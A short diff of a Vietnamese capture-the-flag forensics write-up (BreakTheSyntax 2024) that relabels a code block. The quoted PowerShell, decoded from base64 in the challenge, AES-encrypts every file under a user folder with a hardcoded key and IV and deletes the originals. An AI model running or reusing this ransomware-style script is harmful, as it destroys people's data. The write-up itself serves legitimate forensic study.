@@ -478,7 +478,7 @@ Mode                 LastWriteTime         Length Name
 - Cuộn xuống 1 xíu ta sẽ thấy lệnh thực thi 1 mã base64, decode nó ta được 1 script mã hoá aes. 
 - ![image](/assets/posts/BreakTheSyntax2024/10.png)
 
-```python
+```powershell
 $folder='C:\Users\bob'; Add-Type -AssemblyName System.Security; $provider = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $provider.Key = [System.Text.Encoding]::UTF8.GetBytes("_w4y_b3tt3r_th4n"); $provider.IV = [System.Text.Encoding]::UTF8.GetBytes("0398y9xlczsmrfy8"); Get-ChildItem $folder -File -Recurse | ForEach-Object { $input = New-Object IO.FileStream($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read); $filename = "$($_.FullName).enc"; $output = [System.IO.File]::Create($filename); $cs = New-Object System.Security.Cryptography.CryptoStream($output, $provider.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write); $input.CopyTo($cs); $cs.Close(); $output.Close(); $input.Close(); Remove-Item $_}; $provider.Dispose();
 ```
 - Tại đây nó sử dụng key và iv lần lượt là "_w4y_b3tt3r_th4n" và "0398y9xlczsmrfy8" để mã hoá file thành đuổi enc
